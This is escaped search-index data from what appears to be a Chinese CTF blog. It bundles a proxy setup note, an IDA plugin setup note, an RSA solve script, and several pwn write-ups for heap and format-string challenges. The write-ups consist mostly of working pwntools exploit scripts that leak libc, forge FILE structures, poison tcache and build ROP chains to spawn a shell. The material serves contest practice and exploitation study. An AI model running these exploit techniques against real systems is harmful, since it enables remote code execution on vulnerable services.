&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;更改vmware网络适配器为NAT&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1689763491561.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;Ubuntu下网络设置默认，代理设置如下：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1689763558947.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;终端配置&lt;br&gt;
修改&lt;code&gt;~/.bashrc&lt;/code&gt;，添加&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;export https_proxy=http://10.16.1.102:7890
export http_proxy=http://10.16.1.102:7890
export all_proxy=socks5://10.16.1.102:7890
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后&lt;code&gt;source ~/.bashrc&lt;/code&gt;生效&lt;/p&gt;
&lt;p&gt;git走代理&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git config --global http.https://github.com.proxy socks5://10.16.1.102:7890
git config --global http.proxy 10.16.1.102:7890
git config --global https.proxy 10.16.1.102:7890
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用以下命令可以手动更改git代理设置&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git config --show-origin http.proxy
&lt;/code&gt;&lt;/pre&gt;
">Ubuntu虚拟机走host的clash代理</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/FVrMrT-Fy/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWN：&lt;/h3&gt;
&lt;h4 id=&#34;fmt&#34;&gt;fmt：&lt;/h4&gt;
&lt;p&gt;格式化字符串，第一次泄露栈地址和libc，第二次写ret地址为one_gadget即可&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;60.204.140.184&amp;quot;,30191)
# io=process(&amp;quot;./fmt&amp;quot;)
elf=ELF(&amp;quot;./fmt&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)


io.recvuntil(b&amp;quot;str: &amp;quot;)
payload=b&amp;quot;%8$p.%16$p&amp;quot;
io.sendline(payload)

leak_addr=int(io.recv(14),16)-0x1e94a0
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
io.recvuntil(b&amp;quot;.&amp;quot;)
stack_addr=int(io.recv(14),16)
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))



sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
puts_addr=leak_addr+libc.sym[b&amp;quot;puts&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
_exit=leak_addr+libc.sym[b&amp;quot;_exit&amp;quot;]
shell=leak_addr+0xe3b01

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;other str: &amp;quot;)
payload=fmtstr_payload(6,{stack_addr-0xe8:shell},write_size=&#39;short&#39;)
# payload =fmtstr_payload(6,{malloc_hook:shell},write_size=&#39;short&#39;)+b&amp;quot;%1000000c&amp;quot;
io.sendline(payload)


print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))
print(&amp;quot;shell: &amp;quot;+hex(shell))


io.interactive()

# 0xe3afe execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;misc&#34;&gt;MISC:&lt;/h3&gt;
&lt;h4 id=&#34;usb&#34;&gt;usb:&lt;/h4&gt;
&lt;p&gt;使用mumuzi键盘流量一把梭，然后cyberchef烹饪即可：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1689507053305.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1689507058855.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;crypto&#34;&gt;Crypto：&lt;/h3&gt;
&lt;h4 id=&#34;rsa&#34;&gt;RSA:&lt;/h4&gt;
&lt;p&gt;qwb原题...&lt;br&gt;
[link]&lt;a href=&#34;https://eprint.iacr.org/2015/399.pdf&#34;&gt;https://eprint.iacr.org/2015/399.pdf&lt;/a&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1689510786286.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
最后long_to_bytes即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from gmpy2 import *
m1=8334176273377687778925968652923982846998724107624538105654894737480608040787164942908664678429487595866375466955578536932646638608374859799560790357357355475153852315429988251406716837806949387421402107779526648346112857245251481791000156326311794515247012084479404963628187413781724893173183595037984078029706687141452980915897613598715166764006079337996939237831127877822777298891345240992224457502307777453813403723860370336259768714433691700008761598135158249554720239480856332237245140606893060889458298812027643186014638882487288529484407249417947342798261233371859439003556025622531286607093086262182961900221
m2=22291783101991466901669802811072286361463259096412523019927956845014956726984633944311563809077545336731345629003968417408385538540199052480763352937138063001691494078141034164060073208592072783644252721127901996835233091410441838546235477819239598146496144359952946239328842198897348830164467799618269341456666825968971193729838026760012332020223490546511437879465268118749332615890600046622926159177680882780495663448654527562370133394251859961739946007037825763819500955365636946510343942994301809125029616066868596044885547005547390446468651797783520279531291808102209463733268922901056842903640261702268483580079
n2=26989781630503676259502221325791347584607522857769579575297691973258919576768826427059198152035415835627885162613470528107575781277590981314410130242259476764500731263549070841939946410404214950861916808234008589966849302830389937977667872854316531408288338541977868568209278283760692866116947597445559763998608870359453835826711179703215320653445704522573070650642347871171425399227090705774976383452533375854187754721093890020986550939103071021619840797519979671188117673303672023522910200606134989916541289908538417562640981839074992935652363458747488201289997240226553340491203815779083605965873519144351105635977
e2=65537
c2=15608493359172313429111250362547316415137342033261379619116685637094829328864086722267534755459655689598026363165606700718051739433022581810982230521098576597484850535770518552787220173105513426779515790426303985414120033452747683669501078476628404455341179818932159581239994489678323564587149645006231756392148052557984581049067156468083162932334692086321511063682574943502393749684556026493316348892705114791740287823927634401828970155725090197482067045119003108806888768161101755244340832271562849138340706213702438667804460812804485276133545408754720942940596865774516864097546006862891145251661268265204662316437

r=7
PR = PolynomialRing(Zmod(n2),name=&#39;x&#39;)
x=PR.gen()
fx=m1*m2*x-(m1-m2)
fx=fx.monic()
xx=int(fx.small_roots(X=2^690,beta=0.7,epsilon=0.4)[0])
pp6=gcd(m1*m2*xx-(m1-m2),n2)
A=iroot(pp6,6)
assert A[1]
p=A[0]
q=n2//(pp6*p)
phi = (p**(r-1))*(p-1)*(q-1)
d=invert(e2,phi)

print(pow(c2,d,n2))
&lt;/code&gt;&lt;/pre&gt;
">HWS2023 预选赛 orrr wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/cbkv3xavp/"" data-c="
          &lt;h3 id=&#34;mipsrophttpsgithubcomoraclepiida_pluginstreemainmipsrop&#34;&gt;mipsrop：&lt;a href=&#34;https://github.com/OraclePi/IDA_plugins/tree/main/mipsrop&#34;&gt;https://github.com/OraclePi/IDA_plugins/tree/main/mipsrop&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;将上述链接中的文件复制到ida安装目录的plugins目录下&lt;br&gt;
插件运行时输出窗口内容如下即成功&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Propagating type information...
Function argument information has been propagated
The initial autoanalysis has been finished.
MIPS ROP Finder activated, found 1077 controllable jumps between 0x00000000 and 0x0008A1D4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果运行指令报错&lt;code&gt;NameError: name &#39;mipsrop&#39; is not defined&lt;/code&gt;&lt;br&gt;
idapython中输入即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import mipsrop
mipsrop = mipsrop.MIPSROPFinder()
&lt;/code&gt;&lt;/pre&gt;
">mipsrop配置</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/JYkjVlphv/"" data-c="
          &lt;p&gt;glibc 2.35-0ubuntu3.1_amd64&lt;br&gt;
house of apple2&lt;br&gt;
只给了一次uaf的机会，所以需要对uaf的堆块重复利用&lt;br&gt;
第一次泄露libc，第二次申请时overlap泄露堆地址&lt;br&gt;
后续就是正常house of apple2流程&lt;br&gt;
可以打one_gadget，这里我们修改&lt;code&gt;_flags&lt;/code&gt;为&lt;code&gt;  sh;&lt;/code&gt;打system获取shell&lt;br&gt;
注意堆块构造，大小不超过0x200，下标不超过12；&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28065)
# io=process(&amp;quot;./happy_note&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

def add(s,n,m):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size:\n&amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;note:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;[2]\n&amp;quot;,str(m)) #1-&amp;gt;calloc  2-&amp;gt;malloc 

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;note:\n&amp;quot;,str(n))
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;show?\n&amp;quot;,str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;note:\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;content:\n&amp;quot;,cc)

def func(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;666&amp;quot;)
    io.sendlineafter(b&amp;quot;note:\n&amp;quot;,str(n))
    
def build_fake_file(addr, vtable, _wide_data, rdx=0):
    # fake_file = p64(flag)  # _flags
    # fake_file += p64(addr)  # _IO_read_ptr
    fake_file = b&amp;quot;&amp;quot;
    fake_file += p64(addr)  # _IO_read_end
    fake_file += p64(addr)  # _IO_read_base
    fake_file += p64(addr)  # _IO_write_base
    fake_file += p64(addr + 1)  # _IO_write_ptr
    fake_file += p64(rdx)  # _IO_write_end
    fake_file += p64(addr)  # _IO_buf_base
    fake_file += p64(0)  # _IO_buf_end
    fake_file += p64(0)  # _IO_save_base
    fake_file += p64(0)  # _IO_backup_base
    fake_file += p64(0)  # _IO_save_end
    fake_file += p64(0)  # _markers
    fake_file += p64(0)  # _chain   could be a anathor file struct
    fake_file += p32(1)  # _fileno
    fake_file += p32(0)  # _flags2
    fake_file += p64(0)  # _old_offset
    fake_file += p16(0)  # _cur_column
    fake_file += p8(0)  # _vtable_offset
    fake_file += p8(0x10)  # _shortbuf
    fake_file += p32(0)
    fake_file += p64(0)  # _lock
    fake_file += p64(0)  # _offset
    fake_file += p64(0)  # _codecvt
    fake_file += p64(_wide_data)  # _wide_data
    fake_file += p64(0)  # _freeres_list
    fake_file += p64(0)  # _freeres_buf
    fake_file += p64(0)  # __pad5
    fake_file += p32(0)  # _mode
    fake_file += p32(0)  # unused2
    fake_file += p64(0) * 2  # unused2
    fake_file += p64(vtable)  # vtable
    return fake_file

# gdb.attach(io)
# pause()

for i in range(11):
    add(0x100,i,1)

for i in range(7):
    delete(i)

func(7)
show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x219ce0
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))


_IO_list_all=leak_addr+libc.sym[b&amp;quot;_IO_list_all&amp;quot;]
_IO_list_all_chain=_IO_list_all+0x88
_IO_wfile_jumps=leak_addr+libc.sym[b&amp;quot;_IO_wfile_jumps&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
shell=leak_addr+0xebcf1


add(0x100,0,1) #7

delete(9)
delete(7) #tcachebin 0

show(0) #tcachebin 0
io.recvuntil(b&amp;quot;content: &amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0xc20
key=heap_addr&amp;gt;&amp;gt;12
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))

add(0x100,2,1)
add(0xe8,3,1) #new 0 , uaf , editable
add(0xe8,4,1)

delete(4)
delete(3)

edit(0,p64(key^_IO_list_all))

add(0xe8,5,2) #5
add(0xe8,6,2) #6

add(0x1e8,7,1) #7
add(0x200,11,1) #11
#chunk 10  heap_addr+0xd30
fake_wide_data=heap_addr+0xd40 #chunk 10 content 
fake_jump=heap_addr+0xf30 # chunk 7
fake_IO=heap_addr+0x1120 # chunk 11

_wide_data=b&amp;quot;&amp;quot;
_wide_data=_wide_data.ljust(0x18,b&amp;quot;\x00&amp;quot;)+p64(0)
_wide_data=_wide_data.ljust(0x30,b&amp;quot;\x00&amp;quot;)+p64(0)
_wide_data=_wide_data.ljust(0xe0,b&amp;quot;\x00&amp;quot;)+p64(fake_jump)
edit(10,_wide_data)


edit(6,p64(fake_IO))
payload=b&amp;quot;\x00&amp;quot;*0x58+p64(shell)
payload=payload.ljust(0x1e0,b&amp;quot;\x00&amp;quot;)+b&amp;quot;  sh;&amp;quot;
edit(7,payload)
edit(11,build_fake_file(0,_IO_wfile_jumps,fake_wide_data,0))

delete(9)


io.interactive()

# 0x50a37 posix_spawn(rsp+0x1c, &amp;quot;/bin/sh&amp;quot;, 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebcf1 execve(&amp;quot;/bin/sh&amp;quot;, r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebcf5 execve(&amp;quot;/bin/sh&amp;quot;, r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebcf8 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebd52 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [r12] == NULL || r12 == NULL

# 0xebdaf execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebdb3 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x50 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">[巅峰极客 2022]happy note wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/apppplllllllleeeeeee/"" data-c="
          &lt;h3 id=&#34;without_hook&#34;&gt;without_hook:&lt;/h3&gt;
&lt;p&gt;2.36的glibc&lt;br&gt;
最开始想用house of banana打，结果发现libc和ld偏移不固定&lt;br&gt;
此题选择打house of apple2&lt;br&gt;
&lt;code&gt;magic_gadget&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;
mov rdx, qword ptr [rax + 0x38];
mov rdi, rax; 
call qword ptr [rdx + 0x20];
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过&lt;code&gt;magic_gadget&lt;/code&gt;和&lt;code&gt;setcontext+61&lt;/code&gt;劫持rsp,详细说明放在exp了&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)

def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def exit():
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;5&amp;quot;)

def build_fake_file(addr, vtable, _wide_data, rdx=0):
    # fake_file = p64(flag)  # _flags
    # fake_file += p64(addr)  # _IO_read_ptr
    fake_file = b&amp;quot;&amp;quot;
    fake_file += p64(addr)  # _IO_read_end
    fake_file += p64(addr)  # _IO_read_base
    fake_file += p64(addr)  # _IO_write_base
    fake_file += p64(addr + 1)  # _IO_write_ptr
    fake_file += p64(rdx)  # _IO_write_end
    fake_file += p64(addr)  # _IO_buf_base
    fake_file += p64(0)  # _IO_buf_end
    fake_file += p64(0)  # _IO_save_base
    fake_file += p64(0)  # _IO_backup_base
    fake_file += p64(0)  # _IO_save_end
    fake_file += p64(0)  # _markers
    fake_file += p64(0)  # _chain   could be a anathor file struct
    fake_file += p32(1)  # _fileno
    fake_file += p32(0)  # _flags2
    fake_file += p64(0)  # _old_offset
    fake_file += p16(0)  # _cur_column
    fake_file += p8(0)  # _vtable_offset
    fake_file += p8(0x10)  # _shortbuf
    fake_file += p32(0)
    fake_file += p64(0)  # _lock
    fake_file += p64(0)  # _offset
    fake_file += p64(0)  # _codecvt
    fake_file += p64(_wide_data)  # _wide_data
    fake_file += p64(0)  # _freeres_list
    fake_file += p64(0)  # _freeres_buf
    fake_file += p64(0)  # __pad5
    fake_file += p32(0)  # _mode
    fake_file += p32(0)  # unused2
    fake_file += p64(0) * 2  # unused2
    fake_file += p64(vtable)  # vtable
    return fake_file


add(0,0x608) #fake_wide_data
add(1,0x550) #fake_chain 可控大堆块
add(2,0x600)
add(3,0x540) #小堆块
add(4,0x600)


### leak libc_addr
delete(1)
show(1)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x1f6cc0
tmp=leak_addr+0x1f6cc0+0x4b0
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
###

pop_rdi=leak_addr+0x23ba5
pop_rsi=leak_addr+0x251fe
pop_rdx_rbx=leak_addr+0x8bbb9
pop_rax=leak_addr+0x3f923
ret=leak_addr+0x22d19
_IO_list_all=leak_addr+libc.sym[b&amp;quot;_IO_list_all&amp;quot;]
_IO_wfile_jumps=leak_addr+libc.sym[b&amp;quot;_IO_wfile_jumps&amp;quot;]
setcontext_61=leak_addr+libc.sym[b&amp;quot;setcontext&amp;quot;]+0x3d
open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
magic_gadget=leak_addr+0x160cb6
&#39;&#39;&#39;
mov rdx, qword ptr [rax + 0x38];
mov rdi, rax; 
call qword ptr [rdx + 0x20];
&#39;&#39;&#39;


### leak heap_addr 
add(5,0x900) #fake_jump 0x1f70
edit(1,b&amp;quot;a&amp;quot;*0xf+b&amp;quot;b&amp;quot;)
show(1)
io.recvuntil(b&amp;quot;b&amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x8a0
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))


### largebin attack
delete(3)
edit(1,p64(tmp)*2+p64(0)+p64(_IO_list_all-0x20))
add(6,0x900)
###
add(7,0x540) #将小堆块申请出来，进行unlink，使得_IO_list_all_chain的地址是可控的大堆块的地址，否则伪造fake_file地址非法


# 对fp的设置如下：
# _flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为sh;，注意前面有两个空格
# vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可
# _wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
# _wide_data-&amp;gt;_IO_write_base设置为0，即满足*(A + 0x18) = 0
# _wide_data-&amp;gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0
# _wide_data-&amp;gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
# _wide_data-&amp;gt;_wide_vtable-&amp;gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C


#edit _flags ~(2 | 0x8 | 0x800)
# edit(0,b&amp;quot;\x00&amp;quot;*0x600+p64((~(2 | 0x8 | 0x800))&amp;amp;0xffffffffffffffff))

#fake_wide_data
fake_wide_data=heap_addr+0x2a0
flag_addr=heap_addr+0x2a0

edit(1,build_fake_file(0,_IO_wfile_jumps,fake_wide_data,0))
fake_jump=heap_addr+0x1f70


_wide_data=b&amp;quot;./flag\x00\x00&amp;quot;
_wide_data=_wide_data.ljust(0x18,b&amp;quot;\x00&amp;quot;)+p64(0)
_wide_data=_wide_data.ljust(0x30,b&amp;quot;\x00&amp;quot;)+p64(0)
_wide_data=_wide_data.ljust(0xe0,b&amp;quot;\x00&amp;quot;)+p64(fake_jump)
edit(0,_wide_data)


# gdb.attach(io)
# pause()


#open
orw=p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x4000)+p64(pop_rdx_rbx)+p64(0x50)+p64(0)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x4000)+p64(pop_rdx_rbx)+p64(0x50)+p64(0)+p64(write_a)

payload=p64(setcontext_61)+p64(fake_jump-0x10)*10+p64(magic_gadget) #C -&amp;gt; magic_gadget
payload+=b&amp;quot;\x00&amp;quot;*0x20+p64(heap_addr+0x2010) #orw_addr
payload+=p64(ret)+orw
#这一坨之所以行，首先fake_wide_data设置的fake_jump+0x68跳转执行magic_gadget
#当我们edit时，其中的read函数将读入的数据地址存到rax寄存器中了，则rdx寄存器的值变为[rax+0x38]，即fake_jump-0x10处
#此时call qword ptr [rdx + 0x20]其实调用的是setcontext+61,并且此时rsp值为[rdx+0xa0]，即heap_addr+0x1d10
#heap_addr+0x1d10的地址即为orw的地址，ret等效pop rip，从而执行orw


edit(5,payload)
exit()

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">Hgame week4 复现</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/DLuwxEhs1/"" data-c="
          &lt;p&gt;一道堆风水题目，10次add&lt;br&gt;
每次只能申请0x100或0x60大小堆块&lt;br&gt;
存在&lt;code&gt;bargain&lt;/code&gt;函数可以修改fd（做减法，限制大小0x10，可以输入负数反向修改&lt;br&gt;
重点在于构造tcache链实现任意地址申请    (&lt;s&gt;头大&lt;/s&gt;&lt;/p&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28973)
io=process(&amp;quot;./gift&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(n,cc):
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;gift!\n&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;index?\n&amp;quot;,str(n))

def show(n):
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;index?\n&amp;quot;,str(n))

def edit_off(n,s):
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;5&amp;quot;)
    io.sendlineafter(b&amp;quot;index?\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;much?\n&amp;quot;,str(s))

gdb.attach(io)
pause()

add(1,b&amp;quot;\x00&amp;quot;) #0x100 0
add(1,b&amp;quot;\x00&amp;quot;) #0x100 1
delete(0)
delete(1)

show(1)
io.recvuntil(b&amp;quot;cost: &amp;quot;)
heap_addr=int(io.recv(14),10)-0x260
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))

add(1,cyclic(0x10)+p64(heap_addr+0x400)+cyclic(0x68)+p64(heap_addr+0x410)) #1
add(1,p64(heap_addr+0x390)) #0

delete(0)
delete(1)
edit_off(1,-0x10)

add(1,b&amp;quot;\x00&amp;quot;)
add(1,b&amp;quot;\x00&amp;quot;)
add(1,b&amp;quot;\x00&amp;quot;)

delete(0)
show(0)

io.recvuntil(b&amp;quot;cost: &amp;quot;)
leak_addr=int(io.recv(16),10)-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

one_gadget=[0x4f2a5,0x4f302,0x10a2fc]
shell=leak_addr+one_gadget[1]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

add(1,p64(free_hook-0x10))
add(1,b&amp;quot;\x00&amp;quot;)
add(1,p64(shell))

delete(1)

io.interactive()

# 0x4f2a5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f302 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">[巅峰极客 2022]Gift wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/gnmApmq5l/"" data-c="
          &lt;h3 id=&#34;npuctf_2020_bad_guy&#34;&gt;npuctf_2020_bad_guy&lt;/h3&gt;
&lt;p&gt;第一次做&lt;code&gt;_IO_2_1_stdout_&lt;/code&gt;泄露libc的题&lt;br&gt;
64位，不能正常dump出libc基址，考虑将堆块申请到&lt;code&gt;_IO_2_1_stdout_&lt;/code&gt;处修改&lt;code&gt;_flags&lt;/code&gt;和&lt;code&gt;_IO_2_1_write_base&lt;/code&gt;泄露libc&lt;br&gt;
由于edit堆溢出，修改unsortedbin fd指针（爆破低二字节）后分配0x10大小堆块使剩余堆块进入fastbin，申请堆块到&lt;code&gt;_IO_2_1_stdout_-0x43&lt;/code&gt;处（此处0x7f跟fastbin attack伪造fake chunk同理&lt;br&gt;
